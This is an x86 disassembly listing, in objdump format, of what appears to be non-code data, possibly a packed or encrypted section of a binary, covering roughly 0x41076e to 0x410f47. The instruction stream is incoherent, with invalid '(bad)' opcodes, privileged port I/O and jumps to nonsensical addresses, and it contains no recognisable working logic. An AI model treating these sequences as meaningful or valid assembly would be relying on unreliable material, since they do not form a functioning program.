  41076e:	rol    edx,cl
  410770:	xchg   ecx,eax
  410771:	mov    al,0x41
  410773:	jae    0x4107b9
  410775:	push   0xffffff92
  410777:	mov    al,ds:0xb973441a
  41077c:	xlat   BYTE PTR ds:[ebx]
  41077d:	pop    esi
  41077e:	xchg   DWORD PTR [edi+0x8b284d4],ebx
  410784:	xchg   edi,eax
  410785:	fs das 
  410787:	in     al,dx
  410788:	dec    esi
  410789:	mov    esp,0x58387a79
  41078e:	mov    bl,0xde
  410790:	fisubr DWORD PTR [ebx-0x66]
  410793:	call   0xdadd6d89
  410798:	icebp  
  410799:	imul   eax,DWORD PTR [ecx+edx*4-0x5],0xf
  41079e:	or     eax,0x69530439
  4107a3:	push   esi
  4107a4:	cwde   
  4107a5:	jae    0x4107ad
  4107a7:	jl     0x410736
  4107a9:	in     al,dx
  4107aa:	jg     0x410777
  4107ac:	mov    esp,DWORD PTR [ebp-0x6fc86746]
  4107b2:	jmp    0xfc869628
  4107b7:	xlat   BYTE PTR ds:[ebx]
  4107b8:	loope  0x410832
  4107ba:	int3   
  4107bb:	rcr    DWORD PTR [esi-0x3d14f1e0],cl
  4107c1:	jecxz  0x410830
  4107c3:	sub    ecx,DWORD PTR [ebx+0x4e]
  4107c6:	sbb    esp,DWORD PTR [edx+0x72]
  4107c9:	push   DWORD PTR [ecx]
  4107cb:	ins    DWORD PTR es:[edi],dx
  4107cc:	jae    0x410834
  4107ce:	lea    edi,[ecx-0x7]
  4107d1:	lock cmp al,0x93
  4107d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107d5:	enter  0xd59a,0xaa
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	test   BYTE PTR [edi+ebp*2],dl
  4107dd:	out    0x27,al
  4107df:	mov    ebx,0x2c587784
  4107e4:	dec    ebx
  4107e5:	xchg   DWORD PTR [eax-0x7e],edi
  4107e8:	push   DWORD PTR [eax-0x41]
  4107eb:	mov    BYTE PTR [ebp+0x3c41955c],ah
  4107f1:	mov    eax,ds:0xb7e557ba
  4107f6:	add    eax,0x2f3d0cae
  4107fb:	jg     0x410824
  4107fd:	mov    ds:0x365c2040,al
  410802:	es pop edi
  410804:	mov    edi,0xb671f0a2
  410809:	mov    esp,0xc749a7a8
  41080e:	ins    DWORD PTR es:[edi],dx
  41080f:	adc    ebp,DWORD PTR [esi+0x66bd9903]
  410815:	and    bh,BYTE PTR [ebp+eax*4+0x26]
  410819:	popf   
  41081a:	je     0x410899
  41081c:	mov    gs,WORD PTR [ebx+0x19]
  41081f:	push   esp
  410820:	into   
  410821:	sub    DWORD PTR [ebx-0x6c],edi
  410824:	int    0x99
  410826:	(bad)  [edx]
  410828:	pop    ss
  410829:	sti    
  41082a:	mov    edx,ebp
  41082c:	dec    eax
  41082d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41082e:	xchg   esi,eax
  41082f:	dec    ebp
  410830:	lea    ebp,[esi]
  410832:	mov    esp,0x1f65b923
  410837:	lahf   
  410838:	outs   dx,BYTE PTR ds:[esi]
  410839:	loopne 0x4108a7
  41083b:	popa   
  41083c:	push   cs
  41083d:	fstp   TBYTE PTR [edi+0x6f7196bd]
  410843:	mov    esi,0x1159f7f1
  410848:	cli    
  410849:	enter  0x1ca7,0x34
  41084d:	cwde   
  41084e:	and    bl,cl
  410850:	jp     0x41086b
  410852:	push   ds
  410853:	into   
  410854:	(bad)
  410857:	(bad)  
  410859:	jmp    0x35a2:0x795a995c
  410860:	xchg   BYTE PTR [eax],bh
  410862:	adc    edx,DWORD PTR [ebp-0x7d599aad]
  410868:	xchg   ebx,eax
  410869:	jecxz  0x410886
  41086b:	jno    0x410841
  41086d:	jl     0x410836
  41086f:	cmp    eax,0x5c90d86d
  410874:	lods   eax,DWORD PTR ds:[esi]
  410875:	test   eax,0x516543f7
  41087a:	sbb    eax,0xd9e1b58c
  41087f:	sbb    eax,0xf3318cf2
  410884:	and    esp,0x1ef41db6
  41088a:	leave  
  41088b:	(bad)  
  41088c:	push   ebx
  41088d:	mov    esi,0x65a6ed5f
  410892:	fiadd  WORD PTR [ebx+0x10755f16]
  410898:	cmp    DWORD PTR [ebx+0x20],eax
  41089b:	call   0x652f:0xea9502e2
  4108a2:	pushf  
  4108a3:	rol    BYTE PTR [eax+0x7228e64],0xb9
  4108aa:	inc    esp
  4108ab:	pop    eax
  4108ac:	(bad)  
  4108ad:	jmp    FWORD PTR [ebp+0x26]
  4108b0:	call   0xb0dc:0xe4b43246
  4108b7:	mov    bh,0x87
  4108b9:	dec    eax
  4108ba:	popa   
  4108bb:	lods   al,BYTE PTR ds:[esi]
  4108bc:	mov    BYTE PTR [ecx+0x3affb3eb],dl
  4108c2:	jb     0x4108a7
  4108c4:	add    ch,bl
  4108c6:	xchg   esp,eax
  4108c7:	sub    al,0x55
  4108c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108ca:	mov    eax,ds:0x9df900a0
  4108cf:	rol    DWORD PTR [edi],0x79
  4108d2:	arpl   WORD PTR [esi],di
  4108d4:	icebp  
  4108d5:	xchg   esi,eax
  4108d6:	mov    edx,esp
  4108d8:	inc    ebp
  4108d9:	clc    
  4108da:	arpl   WORD PTR [ebp-0x2705a95e],ax
  4108e0:	jno    0x4108e9
  4108e2:	inc    esi
  4108e3:	into   
  4108e4:	xchg   edi,eax
  4108e5:	sub    BYTE PTR [esi+0x2aa8488b],bh
  4108eb:	outs   dx,DWORD PTR ds:[esi]
  4108ec:	jns    0x4108d8
  4108ee:	push   ss
  4108ef:	jo     0x410904
  4108f1:	cli    
  4108f2:	ret    
  4108f3:	in     eax,dx
  4108f4:	cdq    
  4108f5:	scas   al,BYTE PTR es:[edi]
  4108f6:	jbe    0x4108d4
  4108f8:	and    bl,BYTE PTR [ecx]
  4108fa:	and    dh,BYTE PTR [ebx*8+0x784c14a2]
  410901:	mov    cl,0x2
  410903:	es dec ebx
  410905:	adc    DWORD PTR [ebp+0x49],esi
  410908:	jecxz  0x4108ef
  41090a:	pop    ss
  41090b:	and    eax,0xf046aa14
  410910:	xor    DWORD PTR [edi],eax
  410912:	push   0x4410510d
  410917:	jbe    0x4108d3
  410919:	mov    esp,0xd2daf85d
  41091e:	pop    ds
  41091f:	push   ecx
  410920:	pop    ecx
  410921:	dec    edx
  410922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410923:	jl     0x4108e9
  410925:	mov    bl,0x3e
  410927:	inc    ebp
  410928:	cld    
  410929:	out    dx,eax
  41092a:	enter  0x459c,0x6
  41092e:	loop   0x410930
  410930:	leave  
  410931:	or     al,0xd4
  410933:	xor    dh,bl
  410935:	dec    ebx
  410936:	out    0xa0,al
  410938:	rcl    BYTE PTR [edx+0x103530c4],cl
  41093e:	out    0x63,eax
  410940:	das    
  410941:	pop    ecx
  410942:	ss pop esp
  410944:	add    BYTE PTR [edx-0xa8a09b2],cl
  41094a:	fistp  DWORD PTR [ecx]
  41094c:	(bad)  
  41094d:	addr16 lahf 
  41094f:	nop
  410950:	or     eax,0xbf8a25fa
  410955:	pop    esp
  410956:	xchg   al,ch
  410958:	outs   dx,BYTE PTR ds:[esi]
  410959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41095a:	push   0x7cf29d3a
  41095f:	sbb    eax,0x58db5f02
  410964:	dec    esp
  410965:	test   al,0x6
  410967:	sbb    al,BYTE PTR [eax+0x51]
  41096a:	push   ss
  41096b:	pop    ss
  41096c:	sub    al,0x82
  41096e:	jb     0x4109b4
  410970:	mov    ah,0x8d
  410972:	test   bh,bh
  410974:	dec    ecx
  410975:	adc    eax,0xb32740c3
  41097a:	adc    edi,edi
  41097c:	cli    
  41097d:	out    dx,al
  41097e:	xor    eax,0x54021c06
  410983:	call   FWORD PTR [ecx+eax*1-0x3c]
  410987:	pop    ebx
  410988:	nop
  410989:	ret    
  41098a:	retf   
  41098b:	ficom  DWORD PTR [ecx-0x36]
  41098e:	inc    ebx
  41098f:	(bad)  
  410990:	stc    
  410991:	adc    eax,0x643bab1
  410996:	(bad)  
  410998:	popa   
  410999:	xor    cl,ch
  41099b:	retf   
  41099c:	lods   al,BYTE PTR ds:[esi]
  41099d:	push   esp
  41099e:	daa    
  41099f:	call   0x35c65035
  4109a4:	mov    ch,0x98
  4109a6:	lock mov al,ds:0xc395066b
  4109ac:	mov    BYTE PTR [edi*8+0xf365a68],dh
  4109b3:	out    0xf8,al
  4109b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109b6:	mov    dh,0x36
  4109b8:	inc    ebp
  4109b9:	mov    edx,DWORD PTR [ecx+0x2]
  4109bc:	test   BYTE PTR [ebp-0x6ff51b9f],ch
  4109c2:	jb     0x4109dd
  4109c4:	push   es
  4109c5:	or     al,0x2f
  4109c7:	or     DWORD PTR [esi-0x43],esi
  4109ca:	sar    DWORD PTR [ecx+edx*1],1
  4109cd:	(bad)  
  4109ce:	cdq    
  4109cf:	arpl   ax,bx
  4109d1:	sbb    BYTE PTR [edx],bh
  4109d3:	cmp    al,ch
  4109d5:	or     dh,BYTE PTR [ebp-0x408fdbf8]
  4109db:	(bad)  
  4109dc:	lea    edi,[ecx+0x7bb15582]
  4109e2:	(bad)  
  4109e3:	in     eax,dx
  4109e4:	fs mov bh,0xe8
  4109e7:	dec    esp
  4109e8:	fimul  WORD PTR [esi]
  4109ea:	hlt    
  4109eb:	mov    eax,ds:0xc5e08930
  4109f0:	pop    edi
  4109f1:	bswap  esp
  4109f3:	inc    ebx
  4109f4:	popf   
  4109f5:	inc    eax
  4109f6:	std    
  4109f7:	pop    es
  4109f8:	jge    0x4109a5
  4109fa:	rol    DWORD PTR [ebp+ecx*2+0x3cec9f50],1
  410a01:	sbb    BYTE PTR [edi],bh
  410a03:	pop    eax
  410a04:	push   ss
  410a05:	out    0x4e,al
  410a07:	enter  0x9430,0xa8
  410a0b:	test   BYTE PTR [edi-0x5f],cl
  410a0e:	ret    0x1e67
  410a11:	mov    dl,0xbb
  410a13:	mov    bh,0x47
  410a15:	loop   0x410a73
  410a17:	push   es
  410a18:	clc    
  410a19:	dec    ebp
  410a1a:	add    BYTE PTR ds:0x7f2c43f1,bh
  410a20:	popa   
  410a21:	imul   edi,DWORD PTR [ebp+0x39],0x30ddd1ec
  410a28:	inc    ebx
  410a29:	test   edx,edi
  410a2b:	leave  
  410a2c:	and    ch,BYTE PTR [ebx]
  410a2e:	mov    ebp,DWORD PTR [ebx+ebx*1-0x39]
  410a32:	add    DWORD PTR [ebp+ebx*1-0x4f],esp
  410a36:	inc    ebp
  410a37:	das    
  410a38:	jmp    0x9928:0x5b1b1b
  410a3f:	cmp    eax,0x492e6178
  410a44:	mov    esi,0xdbece704
  410a49:	push   ds
  410a4a:	lock add BYTE PTR [eax+0x29],ah
  410a4e:	push   ss
  410a4f:	pop    es
  410a50:	repz and eax,0x58f3ffeb
  410a56:	test   al,0x89
  410a58:	in     eax,0xc1
  410a5a:	cli    
  410a5b:	mov    bh,0x7c
  410a5d:	pop    ebp
  410a5e:	into   
  410a5f:	xor    al,0xdf
  410a61:	jge    0x410a6c
  410a63:	int    0x9
  410a65:	jns    0x410a39
  410a67:	xchg   ebp,eax
  410a68:	mov    cl,0x40
  410a6a:	loope  0x410a2e
  410a6c:	cmp    ebx,DWORD PTR [edi]
  410a6e:	mov    ecx,0x660330f1
  410a73:	les    ebx,FWORD PTR [edi-0x28fe3ddf]
  410a79:	pop    eax
  410a7a:	repnz push esi
  410a7c:	sub    esp,ebp
  410a7e:	shl    BYTE PTR [ebx+0x2e],cl
  410a81:	(bad)  
  410a82:	lahf   
  410a83:	fnsave [ebx]
  410a85:	mov    eax,ecx
  410a87:	or     dh,BYTE PTR [edx]
  410a89:	mov    ah,0xd9
  410a8b:	push   ecx
  410a8c:	repnz push esi
  410a8e:	xor    ch,BYTE PTR [edx-0x19]
  410a91:	push   esp
  410a92:	lea    di,[esi+esi*2+0x15883306]
  410a9a:	enter  0x1f3,0x3a
  410a9e:	cwde   
  410a9f:	pop    eax
  410aa0:	jns    0x410af0
  410aa2:	loopne 0x410b01
  410aa4:	(bad)  
  410aa5:	pop    ecx
  410aa6:	gs loop 0x410a38
  410aa9:	call   0xf93c:0xf1783ec9
  410ab0:	jmp    0x52f8f69
  410ab5:	lock xchg edi,eax
  410ab7:	sbb    edx,eax
  410ab9:	mov    ecx,0xf553ed4d
  410abe:	out    0x9c,al
  410ac0:	clc    
  410ac1:	das    
  410ac2:	xchg   BYTE PTR [edi-0x2178b3da],bl
  410ac8:	xor    eax,0x405a787a
  410acd:	fild   WORD PTR [ebx-0x57]
  410ad0:	push   ebx
  410ad1:	loope  0x410ac1
  410ad3:	ret    
  410ad4:	fwait
  410ad5:	std    
  410ad6:	sub    BYTE PTR [eax-0x3a],ch
  410ad9:	ja     0x410b4a
  410adb:	fild   QWORD PTR [eax]
  410add:	mov    eax,ds:0xb3a140ae
  410ae3:	shl    DWORD PTR ss:[ebp-0x127d4cdd],1
  410aea:	and    ecx,DWORD PTR [edi]
  410aec:	cmp    DWORD PTR [ecx-0x6a],ebp
  410aef:	sbb    eax,0xcc3608e3
  410af4:	pop    ecx
  410af5:	jae    0x410b6f
  410af7:	test   al,0xb7
  410af9:	push   ss
  410afa:	into   
  410afb:	pop    ss
  410afc:	mov    ebx,0xcda71b40
  410b01:	fimul  WORD PTR [esi+0x5dced3f8]
  410b07:	mov    ds:0xb0807cb0,eax
  410b0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b0d:	std    
  410b0e:	ror    DWORD PTR [esi+0x6bf1b1dc],cl
  410b14:	xchg   ebp,eax
  410b15:	inc    ebx
  410b16:	test   eax,0xaf003056
  410b1b:	jbe    0x410b17
  410b1d:	fwait
  410b1e:	test   DWORD PTR [esi+esi*2+0x45],0x44255799
  410b26:	xchg   ebp,eax
  410b27:	mov    dl,0xfa
  410b29:	mov    ch,0xf6
  410b2b:	xchg   ebx,eax
  410b2c:	lds    ecx,FWORD PTR [edx]
  410b2e:	xchg   ecx,eax
  410b2f:	je     0x410ab6
  410b31:	xor    BYTE PTR [edx],0x41
  410b34:	cld    
  410b35:	sahf   
  410b36:	retf   
  410b37:	jge    0x410b65
  410b39:	pop    ebp
  410b3a:	push   ss
  410b3b:	hlt    
  410b3c:	or     BYTE PTR [edx],0x40
  410b3f:	mul    BYTE PTR [edi+ebp*1+0x4a391314]
  410b46:	(bad)  
  410b47:	adc    al,BYTE PTR [edi]
  410b49:	(bad)  [ebx+0x7c]
  410b4c:	or     esp,DWORD PTR [edx-0x8385511]
  410b52:	mov    al,ds:0xad33df53
  410b57:	lods   al,BYTE PTR ds:[esi]
  410b58:	mov    WORD PTR [eax-0x218b99],ds
  410b5e:	sbb    al,0x15
  410b60:	stos   DWORD PTR es:[edi],eax
  410b61:	mov    BYTE PTR [edx],ah
  410b63:	retf   0x9c2b
  410b66:	(bad)  
  410b67:	cli    
  410b68:	loop   0x410b5c
  410b6a:	aaa    
  410b6b:	dec    eax
  410b6c:	mov    dh,0xd3
  410b6e:	inc    ebp
  410b6f:	xor    dl,al
  410b71:	sub    DWORD PTR [esi-0x45],esi
  410b74:	imul   eax,DWORD PTR ds:0xda202f8d,0xffffff85
  410b7b:	repz ja 0x410b87
  410b7e:	adc    DWORD PTR [ebx-0x6f4fabb],ebp
  410b84:	push   ds
  410b85:	dec    ebx
  410b86:	popf   
  410b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b88:	pop    edx
  410b89:	aam    0xe
  410b8b:	mov    edi,0xf4c83603
  410b90:	adc    BYTE PTR [ebx+0x5384b308],ah
  410b96:	pop    eax
  410b97:	mov    dl,0x96
  410b99:	add    BYTE PTR [eax],bl
  410b9b:	(bad)  
  410b9c:	pop    ecx
  410b9d:	cmp    BYTE PTR [ebp+esi*4-0x9],cl
  410ba1:	xchg   esi,eax
  410ba2:	inc    ebp
  410ba3:	out    0x13,eax
  410ba5:	inc    edi
  410ba6:	xchg   DWORD PTR [eax-0x25],esi
  410ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410baa:	jns    0x410b45
  410bac:	push   ss
  410bad:	sub    eax,DWORD PTR [ecx+0x51b2ddeb]
  410bb3:	outs   dx,BYTE PTR ds:[esi]
  410bb4:	int3   
  410bb5:	add    eax,0x557beaab
  410bba:	fnstsw WORD PTR [edi+0x37ac123a]
  410bc0:	jmp    0x30f3a177
  410bc5:	js     0x410c3a
  410bc7:	ficomp WORD PTR [eax]
  410bc9:	mov    al,ds:0x9f7c8617
  410bce:	stos   BYTE PTR es:[edi],al
  410bcf:	push   0xeff03410
  410bd4:	into   
  410bd5:	loope  0x410c4e
  410bd7:	(bad)  
  410bd9:	dec    eax
  410bda:	jecxz  0x410b7e
  410bdc:	jg     0xc252becc
  410be2:	or     al,0x26
  410be4:	in     eax,dx
  410be5:	push   DWORD PTR [eax-0x248e3413]
  410beb:	inc    esi
  410bec:	inc    ebp
  410bed:	les    edx,FWORD PTR [edi+0x405243a2]
  410bf3:	add    ebp,DWORD PTR [edi+0x1a39a98a]
  410bf9:	sub    al,0x85
  410bfb:	pop    ebx
  410bfc:	mov    dh,0x6a
  410bfe:	sbb    cl,BYTE PTR [ecx]
  410c00:	fwait
  410c01:	xor    ebp,0xf
  410c04:	xchg   ebx,eax
  410c05:	fwait
  410c06:	adc    al,0xfd
  410c08:	mov    cl,BYTE PTR [ebx]
  410c0a:	scas   al,BYTE PTR es:[edi]
  410c0b:	pop    esp
  410c0c:	jecxz  0x410c6d
  410c0e:	into   
  410c0f:	xor    BYTE PTR [edx+0x1f],bh
  410c12:	call   0x30ab9b99
  410c17:	cmp    ah,BYTE PTR [eax-0x7b9ea525]
  410c1d:	cmp    esi,ebp
  410c1f:	popf   
  410c20:	xor    ebx,DWORD PTR [esi+0x51aee993]
  410c26:	repz jp 0x410be5
  410c29:	retf   0x6b2a
  410c2c:	xor    bh,BYTE PTR [eax-0x39]
  410c2f:	cmp    eax,0x5e22c357
  410c34:	out    0xab,eax
  410c36:	mov    bh,ah
  410c38:	adc    BYTE PTR [ecx+0x4433f450],0x88
  410c3f:	rcr    BYTE PTR [esi],1
  410c41:	mov    dl,BYTE PTR [edi-0x666cc2c5]
  410c47:	xchg   edi,eax
  410c48:	inc    ecx
  410c49:	std    
  410c4a:	dec    edx
  410c4b:	scas   eax,DWORD PTR es:[edi]
  410c4c:	loope  0x410cc6
  410c4e:	inc    edx
  410c4f:	xchg   esi,eax
  410c50:	test   eax,0x2bf3b597
  410c55:	out    0xc3,al
  410c57:	mov    cl,0xd0
  410c59:	fstp   TBYTE PTR [ebx-0xbd42559]
  410c5f:	sar    DWORD PTR [ebx-0x3d],cl
  410c62:	or     edi,DWORD PTR [edi-0x550072f6]
  410c68:	adc    dh,BYTE PTR [esi+0x2357c624]
  410c6e:	push   ebx
  410c6f:	jns    0x410ce6
  410c71:	je     0x410c4b
  410c73:	sahf   
  410c74:	retf   
  410c75:	ja     0x410c15
  410c77:	dec    esp
  410c78:	or     edx,DWORD PTR [eax+0x68]
  410c7b:	sub    ah,BYTE PTR [esi+0x35afb408]
  410c81:	jge    0x410cf6
  410c83:	mov    ch,BYTE PTR [ebx]
  410c85:	dec    edi
  410c86:	xor    dl,BYTE PTR [ecx+0x762b29d5]
  410c8c:	scas   al,BYTE PTR es:[edi]
  410c8d:	(bad)  
  410c8e:	or     DWORD PTR ds:[edx+esi*1],esi
  410c92:	jg     0x410c61
  410c94:	loopne 0x410cb9
  410c96:	adc    DWORD PTR [ebx+0x357700a2],ebp
  410c9c:	add    esi,ebp
  410c9e:	ret    0x180f
  410ca1:	call   0xec382d4e
  410ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ca7:	fild   QWORD PTR [eax+ebp*1+0x710bd580]
  410cae:	ins    DWORD PTR es:[edi],dx
  410caf:	cmp    al,dh
  410cb1:	jl     0x410d0e
  410cb3:	data16 test al,0x39
  410cb6:	and    al,BYTE PTR [eax+0x7ea8a320]
  410cbc:	div    BYTE PTR [ebx]
  410cbe:	(bad)
  410cc1:	and    edi,DWORD PTR [edx-0x73]
  410cc4:	jbe    0x410c78
  410cc6:	and    ebx,ebx
  410cc8:	fsubr  DWORD PTR [ebx+0x23]
  410ccb:	inc    esi
  410ccc:	cs xor ebp,0xa62898a5
  410cd3:	xchg   ebx,eax
  410cd4:	ins    BYTE PTR es:[edi],dx
  410cd5:	loopne 0x410cb9
  410cd7:	push   ds
  410cd8:	xchg   ecx,eax
  410cd9:	out    dx,eax
  410cda:	xor    BYTE PTR [eax-0x29ae5187],0x7a
  410ce1:	push   cs
  410ce2:	rol    BYTE PTR [edi+0x235bf8c3],0x28
  410ce9:	jg     0x410cea
  410ceb:	into   
  410cec:	retf   0xef91
  410cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cf0:	aas    
  410cf1:	pop    ebp
  410cf2:	add    eax,DWORD PTR [esi]
  410cf4:	mov    cl,ch
  410cf6:	mov    edx,0x1f1b9d6d
  410cfb:	mov    esi,0xcb8762ff
  410d00:	or     BYTE PTR [ebp+0x66c0e59a],0x43
  410d07:	jns    0x410d29
  410d09:	or     BYTE PTR [eax],bl
  410d0b:	xchg   esi,eax
  410d0c:	rol    DWORD PTR [ebp-0xb6a13e2],1
  410d12:	mov    dl,0x25
  410d14:	fidiv  WORD PTR [ebx+0x7f]
  410d17:	mov    al,ds:0x4ba773e3
  410d1c:	das    
  410d1d:	adc    cl,dh
  410d1f:	sub    BYTE PTR [ecx],bh
  410d21:	retf   0x6752
  410d24:	mov    BYTE PTR [esi+0x21],bh
  410d27:	mov    ebp,0x5b4c571e
  410d2c:	rcr    BYTE PTR [edx+0x78],1
  410d2f:	or     cl,BYTE PTR [eax]
  410d31:	cmp    cl,BYTE PTR [edi+0x58]
  410d34:	mov    ah,0x30
  410d36:	cmc    
  410d37:	mov    ah,0x58
  410d39:	hlt    
  410d3a:	sbb    eax,ebp
  410d3c:	fdivr  st,st(4)
  410d3e:	xor    BYTE PTR [eax+0xbf83489],dl
  410d44:	sub    BYTE PTR [esi],cl
  410d46:	(bad)  
  410d47:	pop    ebx
  410d48:	call   0xf45d26ce
  410d4d:	mov    ah,0x85
  410d4f:	jbe    0x410d4e
  410d51:	scas   eax,DWORD PTR es:[edi]
  410d52:	test   BYTE PTR [eax],dl
  410d54:	clc    
  410d55:	rol    DWORD PTR [eax-0x5b],1
  410d58:	mov    ecx,0x36e393c
  410d5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d5e:	or     eax,0x34e4262c
  410d63:	(bad)  
  410d64:	std    
  410d65:	jne    0x410d8e
  410d67:	sahf   
  410d68:	cld    
  410d69:	jns    0x410dd2
  410d6b:	inc    ebp
  410d6c:	imul   DWORD PTR ds:0xabad1224
  410d72:	jb     0x410dc1
  410d74:	add    DWORD PTR [ebx],esp
  410d76:	stos   BYTE PTR es:[edi],al
  410d77:	gs js  0x410db8
  410d7a:	dec    eax
  410d7b:	ins    DWORD PTR es:[edi],dx
  410d7c:	mov    dh,0x1b
  410d7e:	mov    ebx,0x6004b4f4
  410d83:	add    eax,esp
  410d85:	push   esi
  410d86:	pcmpeqd mm0,QWORD PTR [ecx]
  410d89:	pop    ds
  410d8a:	enter  0x3fdb,0x14
  410d8e:	pop    ss
  410d8f:	(bad)  
  410d90:	shr    BYTE PTR [ebx+0x2441ffb3],cl
  410d96:	and    ah,BYTE PTR [esi+0x6a9367d]
  410d9c:	hlt    
  410d9d:	push   esp
  410d9e:	neg    eax
  410da0:	gs mov edi,0xa28c6320
  410da6:	sahf   
  410da7:	mov    eax,0xb76a8968
  410dac:	fstp   DWORD PTR [esi-0x1ca73be8]
  410db2:	es repz adc bh,dl
  410db6:	scas   al,BYTE PTR es:[edi]
  410db7:	loopne 0x410d4c
  410db9:	int    0xf3
  410dbb:	test   BYTE PTR [ecx-0x71e71d96],bh
  410dc1:	jecxz  0x410d72
  410dc3:	js     0x410e25
  410dc5:	aam    0x8d
  410dc7:	pop    esp
  410dc8:	(bad)  
  410dc9:	into   
  410dca:	lds    edx,FWORD PTR [eax]
  410dcc:	scas   al,BYTE PTR es:[edi]
  410dcd:	cmp    eax,ebp
  410dcf:	aad    0x1e
  410dd1:	cld    
  410dd2:	pop    ebx
  410dd3:	inc    esp
  410dd4:	jnp    0x410d99
  410dd6:	in     eax,dx
  410dd7:	adc    ecx,esi
  410dd9:	dec    ecx
  410dda:	out    dx,al
  410ddb:	sub    edx,DWORD PTR [esi-0xa03a499]
  410de1:	jne    0x410db0
  410de3:	test   ecx,0xf9155d9
  410de9:	stos   BYTE PTR es:[edi],al
  410dea:	(bad)  
  410deb:	mov    ebp,0x6fb73f1b
  410df0:	xchg   edi,esi
  410df2:	lea    ebx,[edi+0x1c53e2d5]
  410df8:	test   eax,0x59072e8f
  410dfd:	test   DWORD PTR [ebx+0x196f4755],edi
  410e03:	mov    BYTE PTR [ebx],ah
  410e05:	and    ebx,ebp
  410e07:	test   al,0x47
  410e09:	dec    esi
  410e0a:	nop    DWORD PTR [ecx+0x2aae7ea]
  410e11:	in     al,0xec
  410e13:	sbb    BYTE PTR [ebp+eax*8+0x25dd18fa],ah
  410e1a:	cmc    
  410e1b:	or     al,0xf
  410e1d:	dec    ebp
  410e1e:	arpl   WORD PTR [ebp+0x57736c80],bx
  410e24:	sahf   
  410e25:	pushf  
  410e26:	lea    edi,ds:0x113b67c8
  410e2c:	ja     0x410df1
  410e2e:	lea    edi,[eax-0x20]
  410e31:	test   al,0x8f
  410e33:	push   DWORD PTR ds:[esp+esi*8-0x6547c4fc]
  410e3b:	fstp   TBYTE PTR [ebp-0x747f89bd]
  410e41:	into   
  410e42:	mov    ds:0xa9823e8d,eax
  410e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e48:	dec    esi
  410e49:	mov    ah,0x86
  410e4b:	mov    eax,DWORD PTR [edx+0x27]
  410e4e:	or     al,0x78
  410e50:	fidivr DWORD PTR gs:0x306faeea
  410e57:	retf   
  410e58:	mov    bh,0x6e
  410e5a:	fisttp DWORD PTR [edx]
  410e5c:	(bad)  
  410e5d:	dec    ecx
  410e5e:	jns    0x410e83
  410e60:	push   ecx
  410e61:	inc    esp
  410e62:	loop   0x410ec1
  410e64:	lods   al,BYTE PTR ds:[esi]
  410e65:	in     eax,dx
  410e66:	jp     0x410ea2
  410e68:	das    
  410e69:	adc    al,0xa4
  410e6b:	test   DWORD PTR [ecx+edx*1-0x1afa15d9],esp
  410e72:	call   0xe15d726b
  410e77:	sahf   
  410e78:	jmp    0x3a46e276
  410e7d:	(bad)  
  410e7e:	ja     0x410e36
  410e80:	mov    edx,0x7aad9112
  410e85:	scas   al,BYTE PTR es:[edi]
  410e86:	and    eax,0x84a3f979
  410e8b:	dec    ebx
  410e8c:	or     ch,dl
  410e8e:	mov    ?,ebx
  410e90:	mov    WORD PTR [edi-0x32357e71],fs
  410e96:	fsub   DWORD PTR [ebp+ebp*2-0x5dd56833]
  410e9d:	arpl   WORD PTR [eax+0x377b034e],dx
  410ea3:	mov    WORD PTR [edi],cs
  410ea5:	icebp  
  410ea6:	sar    ch,1
  410ea8:	not    BYTE PTR [edi]
  410eaa:	add    esp,DWORD PTR [esi]
  410eac:	mov    esp,0xe243485f
  410eb1:	inc    ecx
  410eb2:	imul   ecx,edi,0x7f
  410eb5:	mov    fs,WORD PTR [ebp+0x24]
  410eb8:	int3   
  410eb9:	imul   ebx,DWORD PTR [edi-0x6c],0x7f93f4bd
  410ec0:	adc    BYTE PTR [edi+0x31],al
  410ec3:	pop    ecx
  410ec4:	sti    
  410ec5:	iret   
  410ec6:	dec    ebx
  410ec7:	shl    DWORD PTR [eax+0xc],cl
  410eca:	lods   al,BYTE PTR ds:[esi]
  410ecb:	out    dx,al
  410ecc:	(bad)  
  410ecd:	fmul   DWORD PTR [esi*2+0x3550b672]
  410ed4:	adc    al,0x6e
  410ed6:	inc    edx
  410ed7:	ret    0xef02
  410eda:	and    ah,BYTE PTR [ebp+0x23]
  410edd:	and    ecx,esi
  410edf:	mov    esp,ecx
  410ee1:	outs   dx,BYTE PTR ds:[esi]
  410ee2:	dec    esp
  410ee3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  410ee5:	scas   eax,DWORD PTR es:[edi]
  410ee6:	scas   eax,DWORD PTR es:[edi]
  410ee7:	sub    DWORD PTR [esi+0xa],0xa4bbe548
  410eee:	nop
  410eef:	push   esp
  410ef0:	jmp    0x410f4f
  410ef2:	inc    ebp
  410ef3:	popa   
  410ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef5:	call   0xff32fe55
  410efa:	or     al,0xb5
  410efc:	adc    BYTE PTR [edx+0x5f],dh
  410eff:	mov    esp,0xeca5244c
  410f04:	xchg   BYTE PTR [edx+0x19c3f152],bl
  410f0a:	mov    ecx,0x18b51b37
  410f0f:	bound  ecx,QWORD PTR [ecx-0x31ea0277]
  410f15:	pop    es
  410f16:	jne    0x410ea7
  410f18:	repnz cli 
  410f1a:	js     0x410ed4
  410f1c:	fnsave [ebx]
  410f1e:	dec    eax
  410f1f:	add    ebx,DWORD PTR [eax+0x5d25b118]
  410f25:	jns    0x410efd
  410f27:	sbb    bh,BYTE PTR [edx+0x5cafe5c4]
  410f2d:	or     dh,0xe8
  410f30:	mov    eax,0xb9206373
  410f35:	add    bh,BYTE PTR cs:[edx]
  410f38:	es xor eax,0x75116606
  410f3e:	adc    BYTE PTR [eax+eiz*4-0x70deb3bf],al
  410f45:	and    dl,cl
  410f47:	xor    al,0x98
